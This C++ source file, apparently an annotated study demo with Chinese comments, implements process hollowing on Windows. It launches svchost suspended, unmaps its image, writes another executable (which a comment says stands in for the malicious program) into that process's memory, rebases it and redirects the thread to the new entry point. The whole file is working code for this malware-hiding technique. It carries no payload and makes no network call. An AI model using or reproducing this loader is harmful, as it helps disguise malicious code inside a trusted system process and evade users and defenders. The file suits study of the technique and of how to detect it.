// ProcessHollowing.cpp : Defines the entry point for the console application.

#include "stdafx.h"
#include <windows.h>
#include "internals.h"
#include "pe.h"

void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)	//创建 scvhost.exe无害进程
{
	// 创建进程
	printf("Creating process\r\n");
	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();	//用于指定新进程的主窗口特性的一个结构。
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();	//该结构返回有关新进程及其主线程的信息。
	
	CreateProcessA	// process state is suspened
	(
		0,
		pDestCmdLine,		
		0, 
		0, 
		0, 
		CREATE_SUSPENDED, 
		0, 
		0, 
		pStartupInfo, 
		pProcessInfo
	);

	if (!pProcessInfo->hProcess)	//PROCESS_INFORMATION结构里的hProcess(主线程句柄)
	{
		printf("Error creating process\r\n");

		return;
	}
	
	/********************************************************************************************/
	// 这个demo的做法是在PE.h里构建了PEB的类结构, 其实没那么麻烦, 看https://github.com/kernelm0de/RunPE-ProcessHollowing/blob/master/main.cpp的实现

	// 获取hprocess句柄对应的process的PEB结构, PEB结构里有指向process的内存空间基址的成员指针.
	PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
	// 读取内存, image = 内存空间, 比难懂的 `镜像` 好理解
	PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);	//pPEB->ImageBaseAddress, 指向process的内存空间基址(基地址, 就和PE头文件里的ImageBase一样)
	printf("Opening source image\r\n");


	HANDLE hFile = CreateFileA
	(
		pSourceFile,
		GENERIC_READ, 
		0, 
		0, 
		OPEN_ALWAYS, 
		0, 
		0
	);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Error opening %s\r\n", pSourceFile);
		return;
	}

	DWORD dwSize = GetFileSize(hFile, 0);
	PBYTE pBuffer = new BYTE[dwSize];
	DWORD dwBytesRead = 0;
	ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);

	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);

	PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);

	printf("Unmapping destination section\r\n");

	HMODULE hNTDLL = GetModuleHandleA("ntdll");

	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

	_NtUnmapViewOfSection NtUnmapViewOfSection =
		(_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

	DWORD dwResult = NtUnmapViewOfSection
	(
		pProcessInfo->hProcess, 
		pPEB->ImageBaseAddress
	);

	if (dwResult)
	{
		printf("Error unmapping section\r\n");
		return;
	}

	printf("Allocating memory\r\n");

	PVOID pRemoteImage = VirtualAllocEx
	(
		pProcessInfo->hProcess,
		pPEB->ImageBaseAddress,
		pSourceHeaders->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (!pRemoteImage)
	{
		printf("VirtualAllocEx call failed\r\n");
		return;
	}

	DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress -
		pSourceHeaders->OptionalHeader.ImageBase;

	printf
	(
		"Source image base: 0x%p\r\n"
		"Destination image base: 0x%p\r\n",
		pSourceHeaders->OptionalHeader.ImageBase,
		pPEB->ImageBaseAddress
	);

	printf("Relocation delta: 0x%p\r\n", dwDelta);

	pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;

	printf("Writing headers\r\n");

	if (!WriteProcessMemory
	(
		pProcessInfo->hProcess, 				
		pPEB->ImageBaseAddress, 
		pBuffer, 
		pSourceHeaders->OptionalHeader.SizeOfHeaders, 
		0
	))
	{
		printf("Error writing process memory\r\n");

		return;
	}

	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination = 
			(PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);

		printf("Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);

		if (!WriteProcessMemory
		(
			pProcessInfo->hProcess,			
			pSectionDestination,			
			&pBuffer[pSourceImage->Sections[x].PointerToRawData],
			pSourceImage->Sections[x].SizeOfRawData,
			0
		))
		{
			printf ("Error writing process memory\r\n");
			return;
		}
	}	

	if (dwDelta)
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
			char* pSectionName = ".reloc";		

			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;

			printf("Rebasing image\r\n");

			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;

			IMAGE_DATA_DIRECTORY relocData = 
				pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			while (dwOffset < relocData.Size)
			{
				PBASE_RELOCATION_BLOCK pBlockheader = 
					(PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);

				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlocks = 
					(PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

				for (DWORD y = 0; y <  dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[y].Type == 0)
						continue;

					DWORD dwFieldAddress = 
						pBlockheader->PageAddress + pBlocks[y].Offset;

					DWORD dwBuffer = 0;
					ReadProcessMemory
					(
						pProcessInfo->hProcess, 
						(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);

					//printf("Relocating 0x%p -> 0x%p\r\n", dwBuffer, dwBuffer - dwDelta);

					dwBuffer += dwDelta;

					BOOL bSuccess = WriteProcessMemory
					(
						pProcessInfo->hProcess,
						(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);

					if (!bSuccess)
					{
						printf("Error writing memory\r\n");
						continue;
					}
				}
			}

			break;
		}


		DWORD dwBreakpoint = 0xCC;

		DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress +
			pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

#ifdef WRITE_BP
		printf("Writing breakpoint\r\n");

		if (!WriteProcessMemory
			(
			pProcessInfo->hProcess, 
			(PVOID)dwEntrypoint, 
			&dwBreakpoint, 
			4, 
			0
			))
		{
			printf("Error writing breakpoint\r\n");
			return;
		}
#endif

		LPCONTEXT pContext = new CONTEXT();
		pContext->ContextFlags = CONTEXT_INTEGER;

		printf("Getting thread context\r\n");

		if (!GetThreadContext(pProcessInfo->hThread, pContext))
		{
			printf("Error getting context\r\n");
			return;
		}

		pContext->Eax = dwEntrypoint;			

		printf("Setting thread context\r\n");

		if (!SetThreadContext(pProcessInfo->hThread, pContext))
		{
			printf("Error setting context\r\n");
			return;
		}

		printf("Resuming thread\r\n");

		if (!ResumeThread(pProcessInfo->hThread))
		{
			printf("Error resuming thread\r\n");
			return;
		}

		printf("Process hollowing complete\r\n");
}

int _tmain(int argc, _TCHAR* argv[])
{
	// 找到目标文件
	char* pPath = new char[MAX_PATH];
	GetModuleFileNameA(0, pPath, MAX_PATH);	//获得当前进程的路径名称
	//strrchr() finds the last occurrence of '\\' in pPath. 返回该字符以及其后面的字符.
	pPath[strrchr(pPath, '\\') - pPath + 1] = 0;	//只留下所在的文件夹的路径, 去掉进程名.
	strcat(pPath, "helloworld.exe");	//完成拼接, 得到同目录下的"helloworld.exe"的路径名. 这里这个文件扮演的是恶意程序
	
	CreateHollowedProcess
	(
		"svchost", 
		pPath
	);

	system("pause");

	return 0;
}